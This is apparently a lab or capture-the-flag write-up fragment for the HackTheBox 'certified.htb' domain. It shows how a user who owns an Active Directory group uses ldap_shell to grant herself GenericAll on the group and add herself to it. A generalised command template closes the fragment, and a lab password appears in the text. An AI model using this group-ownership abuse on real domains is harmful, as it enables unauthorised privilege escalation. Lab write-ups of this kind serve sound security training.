The user JUDITH.MADER@CERTIFIED.HTB has ownership of the group MANAGEMENT@CERTIFIED.HTB.

Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.

![[Pasted image 20241110203026.png]]

Add user into group:

```bash
garffff@garffff:~$ ldap_shell certified.htb/judith.mader:judith09
[INFO] Starting interactive shell
judith.mader# set_genericall management judith.mader
[INFO] Found Target DN: CN=Management,CN=Users,DC=certified,DC=htb
[INFO] Target SID: S-1-5-21-729746778-2675978091-3820388244-1104
[INFO] Found Grantee DN: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[INFO] Grantee SID: S-1-5-21-729746778-2675978091-3820388244-1103
[INFO] DACL modified successfully! judith.mader now has control of management
 
judith.mader# add_user_to_group judith.mader management
[INFO] Adding user "Judith Mader" to group "Management" result: OK
```
### Summary

```bash
ldap_shell <domain>/<username>:<password>
set_genericall <target_group> <username>
add_user_to_group <targer_user> <target_group>
```